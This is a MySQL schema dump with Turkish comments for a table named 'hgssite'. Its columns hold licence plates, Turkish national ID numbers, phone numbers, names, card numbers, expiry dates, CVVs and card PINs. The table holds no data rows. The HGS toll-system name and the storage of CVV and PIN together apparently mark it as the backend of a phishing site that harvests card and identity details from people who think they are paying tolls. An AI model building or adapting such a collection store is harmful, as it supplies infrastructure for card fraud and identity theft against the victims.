-- phpMyAdmin SQL Dump
-- version 4.7.3
-- https://www.phpmyadmin.net/
--
-- Anamakine: localhost:3306
-- Üretim Zamanı: 26 Oca 2018, 11:56:24
-- Sunucu sürümü: 5.6.38
-- PHP Sürümü: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `hgs_data`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `hgssite`
--

CREATE TABLE `hgssite` (
  `id` int(11) NOT NULL,
  `plaka` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `tc_no` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `telnum` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `isim_soyisim` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `ccno` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `skt` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `ccv` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `kart_pin` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `tarih` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `onayli` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `hgssite`
--
ALTER TABLE `hgssite`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `hgssite`
--
ALTER TABLE `hgssite`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
